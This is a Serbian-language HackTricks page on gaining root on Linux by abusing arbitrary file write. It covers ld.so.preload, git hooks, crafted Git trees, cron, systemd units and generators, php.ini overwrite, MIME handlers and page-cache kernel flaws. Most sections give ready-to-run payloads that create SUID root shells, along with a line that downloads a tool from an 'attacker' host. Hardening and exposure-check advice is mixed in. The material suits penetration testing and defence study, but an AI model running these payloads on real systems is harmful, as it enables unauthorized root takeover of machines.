# Proizvoljan upis datoteke kao root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemska lista deljenih objekata koje dinamički linker učitava pre ostalih deljenih objekata. Režim bezbednog izvršavanja primenjuje dodatna ograničenja na preloading, tako da putanja do biblioteke kao što je `/tmp/pe.so` nije univerzalna tehnika za SUID-binary.\
Ako možete da kreirate ili izmenite ovu datoteku, proces koji je učita učitaće navedenu biblioteku pre ostalih deljenih objekata, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** su izvršne skripte koje se pokreću tokom događaja u repozitorijumu, uključujući commit i merge operacije. Ako **privilegovana skripta ili korisnik** obavlja te radnje, a napadač može da **piše u fasciklu `.git`**, hook može da se iskoristi za **eskalaciju privilegija**.<sup>[[13]](#references)</sup>

Na primer, moguće je **napraviti skriptu** u git repozitorijumu u fascikli **`.git/hooks`**, tako da se uvek izvršava kada se napravi novi commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privilegovani Git tree export path traversal

Privilegovani synchronizator može da izbegne checkout i umesto toga izlista repozitorijum pod uticajem napadača pomoću `git ls-tree`, pročita svaki blob pomoću `git cat-file`, spoji prijavljenu putanju sa staging direktorijumom i sam je upiše. To postaje **arbitrary file write sa privilegijama sinhronizatora** kada kombinuje `-c safe.directory=*` (čime se isključuje Git-ova zaštita za repozitorijume u vlasništvu drugog korisnika) i izostavi proveru da li je odredište unutar dozvoljene putanje. Apsolutno ime tree unosa navodi Python-ov `os.path.join(stage, name)` da odbaci `stage`; relativno ime koje sadrži `../` izlazi iz njega kada ga sistem datoteka razreši. Pošto aplikacija materijalizuje sirovi tree umesto da od Git-a zatraži checkout, odbijanje putanje tokom checkout-a nikada ne štiti odredište upisa.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Potražite ovakav oblik koda u root servisima, timerima, deployment agentima, uvoznicima šablona i poslovima za backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Unos stabla kodiran je kao `<mode> SP <name> NUL <raw object ID>`. Opcija `git hash-object --literally` namerno dozvoljava podatke objekta koje uobičajeno parsiranje ili `git fsck` mogu odbaciti, pa se u privremenom klonu može napraviti stablo čiji je naziv fajla apsolutna putanja odredišta. Ovaj primer kreira blob cron fajla, umotava napravljeno stablo u commit i pomera granu na njega; za eksploataciju je i dalje potrebno imati dozvolu za ažuriranje repozitorijuma koji koristi privilegovani posao, kao i Git server koji prihvata neispravan objekat.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Ojačavanje bezbednosti mora da obuhvati i preuzimanje sadržaja u repozitorijum i završnu operaciju nad sistemom datoteka:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zamenite `safe.directory=*` tačnim repozitorijumima kojima servis mora da veruje i, kad god je moguće, obrađujte repozitorijume bez root privilegija.
- Odbacite apsolutne nazive i svaku komponentu `.` ili `..` pre materijalizacije. Nakon spajanja putanja, kanonikalizujte ih i proverite da li odredište ostaje unutar predviđenog korenskog direktorijuma.
- Izbegavajte symlink trke između provere i otvaranja: otvorite putanju relativno u odnosu na pouzdani deskriptor direktorijuma, a na Linuxu koristite `openat2()` sa `RESOLVE_BENEATH` i `RESOLVE_NO_SYMLINKS` za putanje pod kontrolom napadača.
- Dajte prednost uobičajenom checkout-u u izolovanom direktorijumu umesto ponovnog implementiranja checkout-a na osnovu izlaza plumbing komandi. Ako je neophodno preuzimanje sirovih objekata, uključite validaciju na strani receive-a, kao što je `receive.fsckObjects=true`; nemojte ublažavati nalaze `receive.fsck.*` koji se odnose na nazive putanja i potrebni su za odbacivanje posebno pripremljenih stabala.

### Postavljanje privilegovane konfiguracije

Neki servisi za upravljanje čuvaju predviđeno stanje sistema u konfiguracionoj datoteci, a kasnije ga postavljaju uz povišene privilegije. Na primer, [openmediavault čuva konfiguraciju u `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a njegov [RPC interfejs](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) može da primeni izmene servisa. Ako nalog sa nižim privilegijama može da upisuje u tu datoteku ili da je zameni, proverite da li može i da zatraži ovlašćeno postavljanje i da li izabrani modul koristi izmenjeno polje kao root. SSH ključevi naloga, zakazane komande i instalacija paketa imaju različite preduslove; samo prisustvo datoteke ili mogućnost upisa u XML datoteku ne dokazuju nijedno od toga. Proverite dozvole datoteke i nadređenog direktorijuma, grupe korisnika koji poziva RPC i njegova RPC ovlašćenja, instaliranu verziju i stvarni potrošač, bez menjanja konfiguracije ili pozivanja operacije primene tokom popisivanja.

Definicije akcija Fail2Ban-a u `/etc/fail2ban/action.d/` predstavljaju još jednu granicu privilegovane konfiguracije. Korisnik koji može da upisuje u taj direktorijum i da ga pretražuje možda može da zameni definiciju akcije ili doda nadjačavanje, ali same dozvole direktorijuma ne dokazuju izvršavanje koda. Potvrdite da omogućeni jail zaista bira pogođenu akciju, da je servis Fail2Ban izvršava sa višim privilegijama i da će doći do ovlašćenog ponovnog učitavanja/pokretanja i odgovarajućeg događaja blokiranja. Nepovezana sudo dozvola za ponovno pokretanje Fail2Ban-a relevantna je samo ako se odnosi na tačan poziv servisa i ako se izmenjena definicija učitava. [Konfiguracija akcija Fail2Ban-a](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) opisuje vezu između direktorijuma akcija i jail-a; njegov [primer akcije](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje da se `actionban` izvršava prilikom blokiranja, sa privilegijama korisnika servisa. Pregledajte dozvole i efektivnu konfiguraciju bez menjanja akcija ili pokretanja blokiranja tokom popisivanja.

Zasebna granica postoji kada omogućeni Fail2Ban jail koristi mail akciju obogaćenu WHOIS podacima. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) odnosio se na nepouzdan WHOIS tekst prosleđen GNU mailutils `mail` komandi, čija je obrada escape sekvenci mogla da izvrši komandu. Korisnik sa nižim privilegijama koji može da upisuje u datoteke može da utiče na odgovor ako može da izmeni konfiguraciju za nadjačavanje servera koju koristi **izabrani WHOIS klijent**; [Debian-ova `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentuje jednu takvu datoteku, ali njena putanja i upotreba zavise od instalacije. Proverite efektivni jail/akciju, identitet servisa, stvarni WHOIS klijent i putanju konfiguracije, implementaciju mail-a, mogućnost kontrole odgovora i ispravku dobavljača ili backport koji je instaliran. Sama mogućnost upisa u WHOIS konfiguracionu datoteku, verzija Fail2Ban-a ili mail akcija ne dokazuju ovaj lanac; tokom pasivnog popisivanja izbegavajte upite ka spoljnim serverima i pokretanje blokiranja.

### Kreiranje TFTP datoteka i privilegovani package hook-ovi

Dostupan TFTP servis može da premosti granicu kontejnera ili lokalnog korisnika kada njegova **efektivna** podešavanja tftpd-hpa pokreću servis kao root, izlažu korenski direktorijum sistema datoteka kao direktorijum `--secure` i omogućavaju `--create`. [Priručnik za tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcije za kreiranje i korisnika. Ovo je mogući način za kreiranje nove datoteke u privilegovanom konfiguracionom direktorijumu, uključujući `/etc/apt/apt.conf.d/`; postojeća datoteka možda ipak neće moći da se zameni. [APT-ov priručnik za konfiguraciju](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentuje komande `APT::Update::Pre-Invoke`. `apt update` pokrenut kao root može da postane potrošač sa višim privilegijama **samo ako** pročita novu konfiguracionu datoteku. Potvrdite stvarne argumente i identitet pokrenutog daemon-a, dostupnost preko mreže i filtriranje, pravila za kreiranje datoteka u ciljnom direktorijumu, efektivni opseg APT konfiguracije i kasniji privilegovani poziv. Podrazumevana datoteka, direktorijum u koji može da se upisuje ili zakazana APT komanda sami po sebi ne dokazuju ceo lanac. Pasivna trijaža treba da čita samo ograničene lokalne konfiguracione podatke i metapodatke, bez otpremanja datoteke ili pokretanja APT-a.

### Cron i vremenske datoteke

Ako možete da **upisujete u datoteke povezane sa cron-om koje root izvršava**, obično možete da dobijete izvršavanje koda pri sledećem pokretanju posla. Zanimljive mete uključuju:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` tajmere i servise koje oni pokreću

Brze provere:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipični putevi zloupotrebe:

- **Dodavanje novog root cron zadatka** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju već izvršava `run-parts`
- **Postavljanje backdoor-a u postojeći timer target** izmenom skripte ili binarne datoteke koju pokreće

Minimalni primer cron payload-a:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ako možete da pišete samo u cron direktorijum koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Beleške:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato dajte prednost nazivima kao što je `backup`, umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` tajmere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmenite ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Fajlovi servisa i socket-a

Ako možete da pišete u **`systemd` unit fajlove** ili fajlove na koje se oni pozivaju, možda ćete moći da izvršite kod kao root ponovnim učitavanjem i pokretanjem unit-a ili čekanjem da se aktivira putanja za aktivaciju servisa/socket-a.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Proverite i dozvole za upis i pretragu nad samim direktorijumom sistemskih unit-a, uključujući ACL-ove: korisnik može da kreira novi unit u `/etc/systemd/system` čak i kada mu je čitanje/listanje direktorijuma zabranjeno. Sama ta putanja ne pokreće ništa. Potvrdite da će system manager učitati novi unit, da pozivalac ima efektivno root-privilegovanu dozvolu za `systemctl start` ili `restart` nad njegovim imenom (ili drugi privilegovani put za aktivaciju) i da se servis pokreće pod željenim identitetom. Izmenjeni postojeći unit koji je već učitan možda će zahtevati `daemon-reload`; ponašanje pri učitavanju novog unit-a sa drugačijim imenom nije isto. Pre nego što wildcard pravilo za restart smatrate dovoljnim, proverite tačne sudo argumente i izuzetke. Pogledajte [putanju pretrage systemd unit-a](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) i [semantiku učitavanja i ponovnog učitavanja systemctl-a](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Zanimljive mete obuhvataju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override fajlove u `/etc/systemd/system/<unit>.d/*.conf`
- Skripte/binarke servisa na koje se pozivaju direktive `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Putanje `EnvironmentFile=` u koje može da se piše, a koje učitava root servis

Brze provere:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Uobičajeni načini zloupotrebe:

- **Prepišite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Dodajte drop-in override** sa zlonamernim `ExecStart=` i prvo uklonite stari
- **Postavite backdoor u skriptu/binarnu datoteku** na koju se unit već poziva
- **Otmite socket-activated service** tako što ćete izmeniti odgovarajući `.service` fajl koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipičan tok aktivacije:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ako ne možete sami da restartujete servise, ali možete da izmenite jedinicu koja se aktivira preko socket-a, možda je dovoljno samo da **sačekate povezivanje klijenta** da biste pokrenuli servis sa backdoor-om kao root.<sup>[[17]](#references)</sup>

### systemd generator direktorijumi

**System generators** su izvršne datoteke koje system manager pokreće pre učitavanja unit datoteka, i tokom pokretanja sistema i pri ponovnom učitavanju konfiguracije. Zato je pristup za pisanje u system-generator direktorijum (ili u postojeći izvršni generator) direktna mogućnost za izvršavanje koda kao root koju je lako prevideti ako se pri proveri gledaju samo `*.service` i `*.timer` datoteke.<sup>[[35]](#references)[[36]](#references)</sup>

Uobičajeni redosled pretrage je `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (neke distribucije izlažu `/lib/systemd/system-generators/` preko `/usr` merge-a). Izvršna datoteka istog imena u ranijem direktorijumu ima prednost nad kasnijom. Nemojte mešati ove **ulazne direktorijume izvršnih datoteka** sa `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, koji sadrže prolazni unit izlaz koji generišu generatori.<sup>[[35]](#references)</sup>

Brze provere:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Novokreirani generator mora da ima postavljen bit za izvršavanje. Ako write primitive može da kontroliše bajtove, ali ne i mode, ciljaj već izvršni generator; njegovo skraćivanje na mestu obično čuva metapodatke. Ako je sam direktorijum zapisiv, kreiraj novi unos i označi ga kao izvršan.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Pokretanje komande `systemctl daemon-reload` nad **system** menadžerom zahteva odgovarajuću autorizaciju, ali ponovo pokreće svaki system generator; u suprotnom sačekajte privilegovano ponovno učitavanje, operaciju nad paketima ili ponovno pokretanje sistema. Direktorijumi user-generatora kao što je `~/.config/systemd/user-generators/` izvršavaju se pod user menadžerom i **sami po sebi ne obezbeđuju root pristup**.<sup>[[35]](#references)</sup>

Radi hardeninga i lova na pretnje, proverite svaku komponentu putanje i ACL, a ne samo završne bitove dozvola; napravite osnovnu evidenciju hash vrednosti i vlasništva paketa za generatore, i postavite upozorenja za kreiranje, preimenovanje, promene sadržaja ili dozvola u svim ulaznim direktorijumima system generatora. Važno je nadgledati upis jer jednokratni generator može da se obriše nakon izvršavanja, dok se stablo generisanih jedinica pod `/run/systemd/generator*` ponovo izgrađuje pri sledećem ponovnom učitavanju.<sup>[[35]](#references)[[36]](#references)</sup>

### Zamenite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki prilagođeni demoni proveravaju PHP koji je dostavio korisnik tako što pokreću `php` sa **restriktivnim `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako sandboxovani kod i dalje ima **bilo kakvu mogućnost upisa** (kao što je `file_put_contents`) i možete da dođete do **tačne putanje `php.ini` datoteke** koju koristi demon, možete da **zamenite tu konfiguraciju** kako biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Tipičan tok:

1. Prvi payload zamenjuje sandbox konfiguraciju.
2. Drugi payload izvršava kod nakon ponovnog omogućavanja opasnih funkcija.

Minimalni primer (zamenite putanju koju koristi demon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ako se daemon izvršava kao root (ili proverava putanje u vlasništvu root-a), drugo izvršavanje daje root kontekst. To je u suštini **eskalacija privilegija prepisivanjem konfiguracije** kada sandboxed runtime i dalje može da upisuje datoteke.

### binfmt_misc

`binfmt_misc` izlaže registracije pod `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa datoteke sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava datoteku koja se podudara, zato proverite te uslove pre nego što ovo tretirate kao putanju za eskalaciju privilegija.<sup>[[21]](#references)</sup>

Izvršni pomoćni program sa `CAP_DAC_OVERRIDE` može da predstavlja zasebnu putanju za registraciju ako prihvata podatke pod kontrolom pozivaoca i upisuje ih u `/proc/sys/fs/binfmt_misc/register`, čak i kada pozivalac ne može direktno da upisuje u taj čvor. Tokom enumeracije pregledajte ulazne podatke pomoćnog programa i ponašanje pri upisu, ali ga nemojte izvršavati. Ako registrovano pravilo koristi oznaku `C`, interpreter dobija akreditive zasnovane na binarnoj datoteci koja se podudara; zato SUID datoteka u vlasništvu root-a može da pokrene interpreter pod kontrolom pozivaoca kao root. Potvrdite montiranje `binfmt_misc` i smernice za registraciju, efektivnu sposobnost pomoćnog programa, tačno pravilo i putanju do interpretera, SUID ciljnu datoteku koja se može izvršavati, kao i to da li `no_new_privs` ili `nosuid` mount sprečava SUID prelaz. Sam bit sposobnosti ili ugrađeni niz putanje predstavlja samo povod za proveru.<sup>[[21]](#references)</sup> Pogledajte [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) za uslove pod kojima se SUID efekat potiskuje.

### Prepisivanje rukovalaca šema (kao što su http: ili https:)

Desktop okruženja koriste MIME asocijacije i desktop unose da bi izabrala aplikaciju za URI šeme; napadač koji može da upisuje u relevantnu konfiguraciju korisnika i direktorijume desktop unosa može da preusmeri te šeme na pokretač koji kontroliše. Izmenom datoteke `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS rukovaoci URL-ovima upućuju na zlonamernu datoteku (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pokrene taj desktop unos.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root izvršava skripte/binarne datoteke kojima može da piše korisnik

Ako privilegovani workflow pokrene nešto poput `/bin/sh /home/username/.../script` (ili bilo koju binarnu datoteku unutar direktorijuma čiji je vlasnik neprivilegovani korisnik), možete da ga preotmete:<sup>[[1]](#references)</sup>

- **Otkrivanje izvršavanja:** nadgledajte procese pomoću pspy da biste uhvatili root-a kako pokreće putanje pod kontrolom korisnika.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Proverite mogućnost pisanja:** uverite se da su ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika i da možete da ih menjate.
- **Preuzmite kontrolu nad ciljnom datotekom:** napravite rezervnu kopiju originalnog binary/script fajla i ubacite payload koji kreira SUID shell (ili izvršava neku drugu root akciju), a zatim vratite dozvole:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Pokrenite privileged action** (npr. pritisnite dugme u UI-ju koje pokreće helper). Kada root ponovo pokrene preuzetu putanju, preuzmite shell sa eskaliranim privilegijama pomoću `./rootshell -p`.

### Izmena privileged binarnih fajlova samo u page cache-u

Neke kernel ranjivosti ne menjaju fajl **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljivog fajla. Ako možete da ciljate **setuid** binarni fajl ili neki drugi fajl koji izvršava root, sledeće pokretanje može da izvrši bajtove iz memorije koje kontroliše napadač i eskalira privilegije, iako se hash fajla na disku nije promenio.<sup>[[3]](#references)[[4]](#references)</sup>

Ovo je korisno posmatrati kao **primitiv za upis u fajl samo tokom izvršavanja**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bajtovi na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju ili izvršavaju keširanu stranicu dobijaju sadržaj koji je izmenio napadač
- **Efekat je privremen**: izmena nestaje nakon ponovnog pokretanja ili izbacivanja iz keša

Ovaj primitiv se nalazi između klasičnog **arbitrary file write** i starijih ranjivosti koje zloupotrebljavaju page cache, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja u poziciji upisa
- Primitiv koji menja samo page cache može biti pouzdaniji ako ranjiva putanja omogućava direktan upis u keširane stranice koje su povezane sa fajlom

#### Generički privesc tok

1. Nabavite kernel primitiv koji može da upisuje u **stranice page cache-a povezane sa fajlom**
2. Iskoristite ga protiv **čitljivog privileged binarnog fajla** ili nekog drugog fajla koji izvršava root
3. Pokrenite izvršavanje **pre** nego što se stranica izbaci iz keša
4. Ostvarite izvršavanje koda kao root dok fajl na disku i dalje izgleda neizmenjeno

Tipične mete visoke vrednosti:

- **setuid-root** binarni fajlovi
- Helper-i koje pokreću **root servisi**
- Binarni fajlovi koji se često izvršavaju iz **kontejnera koji dele host kernel/page cache**

#### Primer putanje AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux API-ju za kriptografiju iz userspace-a (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da prenese reference na stranice page cache-a iz čitljivog fajla u crypto TX scatterlist
- in-place decrypt putanja `algif_aead` ponovo je koristila source i destination buffere
- zatim је `authencesn` upisivao u region destination taga
- kada su reference tog regiona i dalje pokazivale na stranice fajla u page cache-u, upis je završavao u **page cache-u ciljnog fajla**

Zato zanimljiva tehnika nije sam CVE, već obrazac:

- **proslediti stranice keša povezane sa fajlom kernel podsistemu**
- navesti podsistem da ih **tretira kao izlaz u koji može da upisuje**
- pokrenuti mali, kontrolisani upis preko postojećeg sadržaja u memoriji

Javno dostupan PoC koristio je ponovljene **upise od 4 bajta** da izmeni `/usr/bin/su` u memoriji, a zatim ga je izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### Primer putanje ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **upisa u root preko page cache-a**: ovoga puta odredište je **IPsec ESP decrypt**, a ne `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je **korak „pranja” metapodataka**:

- `splice()` postavlja **read-only stranicu page cache-a povezanu sa fajlom** u ESP-in-UDP paket
- prvobitna DirtyFrag mitigacija označavala je taj skb sa `SKBFL_SHARED_FRAG`, da bi `esp_input()` **napravio kopiju pre dešifrovanja**
- netfilter `TEE` duplira paket kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zadržava **istu fizičku referencu na page cache**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim smatra da je klon bezbedan i pokreće **in-place `cbc(aes)` decrypt** nad stranicom povezanoj sa fajlom

Pouka za reviewere šira je od samog CVE-a: ako mitigacija zavisi od **metapodataka skb/page-a** da bi odlučila da li prvo mora da napravi kopiju, svaka **putanja za kloniranje/kopiranje koja zadržava pozadinsku stranicu, ali odbacuje metapodatke**, može neprimetno ponovo da omogući primitiv za upis.

Tipičan tok eksploatacije:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` da biste dobili **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podignite loopback i instalirajte **netfilter `TEE` pravilo** u `mangle/OUTPUT`
3. instalirajte **XFRM ESP transport SA-e** preko `NETLINK_XFRM`
4. kodirajte svaku ciljnu 4-bajtну reč u SA `seq_hi` polju (DirtyFrag-ov trik za izbor reči)
5. pošaljite spliced ESP-in-UDP paket, tako da **TEE clone** stigne do `esp_input()` i dešifruje podatke **in-place**
6. ponavljajte dok kopija `/usr/bin/su` ili drugog privileged izvršnog fajla u page cache-u ne sadrži kod koji kontroliše napadač

U praksi, uticaj je isti kao u primeru `AF_ALG`: fajl na disku ostaje čist, ali `execve()` koristi **izmenjene bajtove iz page cache-a** i daje root privilegije.<sup>[[8]](#references)[[9]](#references)</sup>

Korisne provere izloženosti za ovu varijantu:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Smanjenje površine napada na kratak rok ovde takođe zavisi od putanje: nadogradnja na kernel koji sadrži `48f6a5356a33` ispravlja putanju clone, dok blokiranje automatskog učitavanja `xt_TEE` uklanja **korak za pranje zastavica**, a blokiranje `esp4` / `esp6` uklanja **odredište za dešifrovanje**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i potraga

Ako sumnjate na ovu klasu greške, nemojte se oslanjati samo na provere integriteta diska. Takođe proverite:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Vrednosti konfiguracije u nastavku razlikuju interfejs koji se može učitati od onog koji je ugrađen u kernel; pravila za crypto build mapiraju `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učita/ukloni kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binarni fajlovi su dobre mete jer zakrpa koja menja samo page cache može biti dovoljna da lokalni foothold pretvori u root

#### Smanjenje površine napada za putanju `algif_aead`

Ako ranjivi interfejs obezbeđuje modul koji se može učitati:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ako je kompajliran u kernel, u nekim prijavama je navedeno da se init putanja blokira pomoću:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Ovu vrstu ublažavanja vredi imati na umu i kod drugih kernel LPE-ova: ako eksploatacija zavisi od određenog opcionog interfejsa, njegovo isključivanje ili stavljanje na crnu listu može prekinuti putanju eksploatacije čak i pre nego što bude dostupna potpuna nadogradnja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – preuzimanje skripte koja se izvršava kao root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – često postavljana pitanja](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Objava Openwall oss-security za CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Ispravka za Linux stable: crypto: algif_aead - vraćanje rada van mesta](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — savetodavno obaveštenje za CVE-2026-31431](https://copy.fail/)
- [7] [Tehnički izveštaj Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repozitorijum / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
